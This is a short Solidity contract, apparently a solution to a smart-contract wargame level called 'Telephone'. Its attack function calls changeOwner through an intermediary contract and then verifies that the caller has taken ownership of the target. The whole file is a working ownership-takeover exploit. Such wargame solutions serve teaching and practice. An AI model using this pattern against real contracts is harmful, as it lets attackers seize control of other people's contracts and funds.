// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/ITelephone.sol";

contract TelephoneAttack {
    function attack(ITelephone target) external {
        target.changeOwner(msg.sender);

        require(msg.sender == target.owner(), "Telephone: Attack failed");
    }
}
